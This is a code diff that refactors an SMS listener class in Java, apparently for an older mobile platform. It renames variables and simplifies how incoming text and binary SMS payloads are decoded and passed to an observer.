@@ -194,9 +194,9 @@ public class SmsListener45 extends SmsListener implements iSingleton {
             debug.trace("notify: " + observer);
             //#endif
 
-            String msg = getSmsDataMessage(message);
+            String dataMsg = getSmsDataMessage(message);
             String address = message.getAddress();
-            observer.onNewSms(msg, address, incoming);
+            observer.onNewSms(dataMsg, address, incoming);
         }
 
         return true;
@@ -211,29 +211,29 @@ public class SmsListener45 extends SmsListener implements iSingleton {
     private String getSmsDataMessage(
             final javax.wireless.messaging.Message message) {
 
-        String msg=null;
+        String dataMsg = null;
 
         if (message instanceof TextMessage) {
             final TextMessage tm = (TextMessage) message;
-             msg = tm.getPayloadText();
+            final String msg = tm.getPayloadText();
             //#ifdef DEBUG
             debug.info("Got Text SMS: " + msg);
             //#endif
 
+            dataMsg = msg;
+
         } else if (message instanceof BinaryMessage) {
-            byte[] dataMsg = ((BinaryMessage) message).getPayloadData();
+            byte[] data = ((BinaryMessage) message).getPayloadData();
 
             try {
 
-                String msg8 = new String(dataMsg, "UTF-8");
-                String msg16 = new String(dataMsg, "UTF-16BE");
-                
+                //String msg16 = new String(data, "UTF-16BE");
+                dataMsg = new String(data, "UTF-8");
+
                 //#ifdef DEBUG
-                debug.trace("saveLog msg16:" + msg16);
-                debug.trace("saveLog msg8:" + msg8);
+                //debug.trace("saveLog msg16:" + msg16);
+                debug.trace("saveLog msg8:" + dataMsg);
                 //#endif
-                
-                msg=msg8;
 
             } catch (final UnsupportedEncodingException e) {
                 //#ifdef DEBUG
@@ -241,10 +241,10 @@ public class SmsListener45 extends SmsListener implements iSingleton {
                 //#endif
             }
             //#ifdef DEBUG
-            debug.info("Got Binary SMS, len: " + dataMsg.length);
+            debug.info("Got Binary SMS, len: " + dataMsg.length());
             //#endif
         }
-        return msg;
+        return dataMsg;
     }
 
 }
